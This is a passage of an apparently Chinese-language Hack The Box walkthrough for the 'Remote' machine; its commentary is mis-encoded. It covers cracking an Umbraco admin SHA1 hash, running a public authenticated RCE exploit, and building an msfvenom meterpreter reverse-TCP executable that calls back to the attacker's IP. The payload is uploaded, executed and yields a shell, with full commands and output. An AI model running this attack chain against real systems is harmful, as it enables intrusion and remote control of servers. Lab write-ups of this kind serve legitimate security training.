RawPasswordValue, SecurityStamp, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/password/changepassword change</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/password/changepassword change</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">adminAdministratorsCADMOSKTPIURZ:5F7</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating TourData, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.137User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate</span><br><span class="line">root@JIYE:~/htb/remote/site_backups/App_Data<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>å…¶ä¸­é‡è¦ä¿¡æ¯ä¸ºadminç”¨æˆ·ä¸ºadmin@htb.localï¼Œå¹¶ä¸”hashå€¼ä¸ºå¦‚ä¸‹</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="string">&quot;hashAlgorithm&quot;</span>:<span class="string">&quot;SHA1&quot;</span>&#125;</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br></pre></td></tr></table></figure><p><code>è§£ç æ•£åˆ—hashå€¼</code><span class="exturl" data-url="aHR0cHM6Ly9jcmFja3N0YXRpb24ubmV0Lw==">URL<i class="fa fa-external-link-alt"></i></span></p><img src="/2020/08/31/HTB-remote/image-20200831194146064.png" class><p><code>ä¿å­˜ç”¨æˆ·ä¸å¯†ç </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/remote<span class="comment"># cat user.txt </span></span><br><span class="line">user:admin@htb.local</span><br><span class="line"><span class="built_in">hash</span>:b8be16afba8c314ad33d812f22a04991b90e2aaa</span><br><span class="line">crack:baconandcheese</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x05-æŸ¥æ‰¾umbraco-exploit"><a href="#0x05-æŸ¥æ‰¾umbraco-exploit" class="headerlink" title="0x05.æŸ¥æ‰¾umbraco exploit"></a>0x05.æŸ¥æ‰¾umbraco exploit</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25vcmFqL1VtYnJhY28tUkNF">exp URL<i class="fa fa-external-link-alt"></i></span></p><img src="/2020/08/31/HTB-remote/image-20200831200103525.png" class><h2 id="0x06-åˆ©ç”¨"><a href="#0x06-åˆ©ç”¨" class="headerlink" title="0x06.åˆ©ç”¨"></a>0x06.åˆ©ç”¨</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/remote<span class="comment"># git clone https://github.com/noraj/Umbraco-RCE.git</span></span><br><span class="line">root@JIYE:~/htb/remote<span class="comment"># ls</span></span><br><span class="line">nmap.CV  site_backups  Umbraco-RCE  user.txt</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment"># cd Umbraco-RCE/</span></span><br><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment"># ls</span></span><br><span class="line">exploit.py  LICENSE  README.md  requirements.txt</span><br><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹å‚æ•°</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Usage</span><br><span class="line">$ python exploit.py -h</span><br><span class="line">usage: exploit.py [-h] -u USER -p PASS -i URL -c CMD [-a ARGS]</span><br><span class="line"></span><br><span class="line">Umbraco authenticated RCE</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>                 show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -u USER, --user USER       username / email</span><br><span class="line">  -p PASS, --password PASS   password</span><br><span class="line">  -i URL, --host URL         root URL</span><br><span class="line">  -c CMD, --<span class="built_in">command</span> CMD      <span class="built_in">command</span></span><br><span class="line">  -a ARGS, --arguments ARGS  arguments</span><br><span class="line">Examples:</span><br><span class="line"></span><br><span class="line">$ python exploit.py -u admin@example.org -p password123 -i <span class="string">&#x27;http://10.0.0.1&#x27;</span> -c ipconfig</span><br><span class="line">$ python exploit.py -u admin@example.org -p password123 -i <span class="string">&#x27;http://10.0.0.1&#x27;</span> -c powershell.exe -a <span class="string">&#x27;-NoProfile -Com</span></span><br></pre></td></tr></table></figure><p><code>exp</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment"># python3 exploit.py -u admin@htb.local -p baconandcheese -i &#x27;http://10.10.10.180&#x27; -c powershell.exe -a &#x27;ls C:/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                               </span><br><span class="line">----                -------------         ------ ----                               </span><br><span class="line">d-----        2/20/2020   1:13 AM                ftp_transfer </span><br><span class="line">d-----        2/19/2020   3:11 PM                inetpub                             </span><br><span class="line">d-----        2/19/2020  11:09 PM                Microsoft                           </span><br><span class="line">d-----        9/15/2018   3:19 AM                PerfLogs                           </span><br><span class="line">d-r---        2/23/2020   2:19 PM                Program Files                       </span><br><span class="line">d-----        2/23/2020   2:19 PM                Program Files (x86)                 </span><br><span class="line">d-----        8/31/2020   4:27 AM                site_backups</span><br><span class="line">d-r---        2/19/2020   3:12 PM                Users                              </span><br><span class="line">d-----        2/20/2020  12:52 AM                Windows                             </span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹ç½‘ç«™æ ¹ç›®å½•ï¼Œå…³æ³¨Mediaï¼Œåé¢æœ‰ç”¨</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment"># python3 exploit.py -u admin@htb.local -p baconandcheese -i &#x27;http://10.10.10.180&#x27; -c powershell.exe -a &#x27;ls C:/inetpub&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\inetpub</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----                               </span><br><span class="line">d-----        2/19/2020   3:11 PM                custerr</span><br><span class="line">d-----        2/19/2020   3:11 PM                ftproot</span><br><span class="line">d-----        2/20/2020   1:33 AM                <span class="built_in">history</span>                            </span><br><span class="line">d-----        2/19/2020   4:36 PM                logs</span><br><span class="line">d-----        2/19/2020   3:11 PM                temp</span><br><span class="line">d-----        2/20/2020  12:16 PM                wwwroot                                                               </span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment"># python3 exploit.py -u admin@htb.local -p baconandcheese -i &#x27;http://10.10.10.180&#x27; -c powershell.exe -a &#x27;ls C:/inetpub/wwwroot&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\inetpub\wwwroot</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                               </span><br><span class="line">----                -------------         ------ ----                               </span><br><span class="line">d-----        2/19/2020   6:02 PM                App_Browsers</span><br><span class="line">d-----        2/20/2020   1:59 AM                App_Data                           </span><br><span class="line">d-----        2/19/2020  10:29 PM                App_Plugins                         </span><br><span class="line">d-----        2/19/2020   3:12 PM                aspnet_client                       </span><br><span class="line">d-----        2/19/2020  11:30 PM                bin                                 </span><br><span class="line">d-----        2/19/2020   6:02 PM                Config                             </span><br><span class="line">d-----        2/19/2020  10:29 PM                css                                 </span><br><span class="line">d-----        8/31/2020   7:57 AM                Media                               </span><br><span class="line">d-----        2/19/2020  10:29 PM                scripts                             </span><br><span class="line">d-----        2/19/2020   6:02 PM                Umbraco                             </span><br><span class="line">d-----        2/19/2020   6:02 PM                Umbraco_Client                     </span><br><span class="line">d-----        2/19/2020  10:29 PM                Views</span><br><span class="line">-a----        11/1/2018   1:06 PM            152 default.aspx                       </span><br><span class="line">-a----        11/1/2018   1:06 PM             89 Global.asax                         </span><br><span class="line">-a----        2/20/2020  12:57 AM          28539 Web.config                                                            </span><br><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x07-ç™»å…¥web-application"><a href="#0x07-ç™»å…¥web-application" class="headerlink" title="0x07.ç™»å…¥web application"></a>0x07.ç™»å…¥web application</h2><p><code>å‘ç°Mediaæ¨¡å—å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼ŒåŒæ—¶è¿˜å‘äº†æŸä½&quot;å‰è¾ˆ&quot;ä¸Šä¼ çš„exeæ‰§è¡Œç¨‹åºğŸ˜‚</code></p><img src="/2020/08/31/HTB-remote/image-20200831203504989.png" class><p><code>msfç”Ÿæˆexeä¸Šä¼ </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/remote<span class="comment"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.216 LPORT=6666 -f exe -o demo.exe</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 341 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">Saved as: demo.exe</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment"># ls</span></span><br><span class="line">demo.exe  nmap.CV  site_backups  Umbraco-RCE  user.txt</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>ä¸Šä¼ demo.exeï¼Œç„¶è€Œåœ¨è¿™é‡Œæ˜¯æ²¡æœ‰ä¸Šä¼ åˆ°Mediaç›®å½•ä¸‹çš„</code></p><img src="/2020/08/31/HTB-remote/image-20200831204758326.png" class><p><code>å†æ¬¡ä¸Šä¼ </code></p><img src="/2020/08/31/HTB-remote/image-20200831205321509.png" class><img src="/2020/08/31/HTB-remote/image-20200831205359285.png" class><p><code>è¾“å…¥ä¸€ä¸ªåå­—ï¼Œå¹¶ç‚¹å‡»ä¿å­˜</code></p><img src="/2020/08/31/HTB-remote/image-20200831223611754.png" class><p><code>è¿™é‡Œä¸Šä¼ æˆåŠŸ</code></p><img src="/2020/08/31/HTB-remote/image-20200831223730143.png" class><p><code>å‘½ä»¤è¡Œä¸‹å†æ¬¡æŸ¥çœ‹ï¼Œç»“æœæ˜¯å­˜åœ¨çš„ï¼Œä¸Šä¼ æˆåŠŸ</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment"># python3 exploit.py -u admin@htb.local -p baconandcheese -i &#x27;http://10.10.10.180&#x27; -c powershell.exe -a &#x27;ls C:/inetpub/wwwroot/Media/1033&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\inetpub\wwwroot\Media\1036</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="line">----                -------------         ------ ----                                                                  </span><br><span class="line">-a----        8/31/2020   8:57 AM          73802 demo.exe                                                              </span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x08-åå¼¹shell"><a href="#0x08-åå¼¹shell" class="headerlink" title="0x08.åå¼¹shell"></a>0x08.åå¼¹shell</h2><p><code>msfç›‘å¬</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 10.10.17.216</span><br><span class="line">lhost =&gt; 10.10.17.216</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 6666</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf5 exploit(multi/handler) &gt;</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:6666 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>æ‰§è¡Œdemo.exe</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/remote/Umbraco-RCE<span class="comment"># python3 exploit.py -u admin@htb.local -p baconandcheese -i &#x27;http://10.10.10.180&#x27; -c powershell.exe -a &#x27;C:/inetpub/wwwroot/Media/1033/demo.exe&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>å¾—åˆ°shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:6666 </span><br><span class="line">[*] Sending stage (176195 bytes) to 10.10.10.180</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.17.216:6666 -&gt; 10.10.10.180:49688) at 2020-08-31 10:41:25 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; whoami</span><br><span class="line">[-] Unknown <span class="built_in">command</span>: whoami.</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: IIS APPPOOL\DefaultAppPool</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><code>å¯»æ‰¾user.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3180 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\windows\system32\inetsrv&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">iis apppool\defaultapppool</span><br><span class="line"></span><br><span class="line">C:\windows\system32\inetsrv&gt;<span class="built_in">cd</span>\</span><br><span class="line"><span class="built_in">cd</span>\</span><br><span class="line"></span><br><span class="line">C:\&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE23-EB3E</span><br><span class="line"></span><br><span class="line"> Directory of C:\</span><br><span class="line"></span><br><span class="line">02/20/2020  02:13 AM    &lt;DIR&gt;          ftp_transfer</span><br><span class="line">02/19/2020  04:11 PM    &lt;DIR&gt;          inetpub</span><br><span class="line">02/20/2020  12:09 AM    &lt;DIR&gt;          Microsoft</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          PerfLogs</span><br><span class="line">02/23/2020  03:19 PM    &lt;DIR&gt;          Program Files</span><br><span class="line">02/23/2020  03:19 PM    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">08/31/2020  09:32 AM    &lt;DIR&gt;          site_backups</span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          Users</span><br><span class="line">02/20/2020  01:52 AM    &lt;DIR&gt;          Windows</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               9 Dir(s)  19,406,811,136 bytes free</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">cd</span> Users    </span><br><span class="line"><span class="built_in">cd</span> Users</span><br><span class="line"></span><br><span class="line">C:\Users&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE23-EB3E</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users</span><br><span class="line"></span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          .</span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          ..</span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          .NET v2.0</span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          .NET v2.0 Classic</span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          .NET v4.5</span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          .NET v4.5 Classic</span><br><span class="line">08/31/2020  10:33 AM    &lt;DIR&gt;          Administrator</span><br><span class="line">02/19/2020  04:12 PM    &lt;DIR&gt;          Classic .NET AppPool</span><br><span class="line">02/20/2020  03:42 AM    &lt;DIR&gt;          Public</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               9 Dir(s)  19,406,811,136 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users&gt;<span class="built_in">cd</span> Public</span><br><span class="line"><span class="built_in">cd</span> Public</span><br><span class="line"></span><br><span class="line">C:\Users\Public&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE23-EB3E</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Public</span><br><span class="line"></span><br><span class="line">02/20/2020  03:42 AM    &lt;DIR&gt;          .</span><br><span class="line">02/20/2020  03:42 AM    &lt;DIR&gt;          ..</span><br><span class="line">02/19/2020  04:03 PM    &lt;DIR&gt;          Documents</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Downloads</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Music</span><br><span class="line">09/15/2018  03:19 AM    &lt;DIR&gt;          Pictures</span><br><span class="line">08/31/2020  10:33 AM                34 user.txt</span><br><span 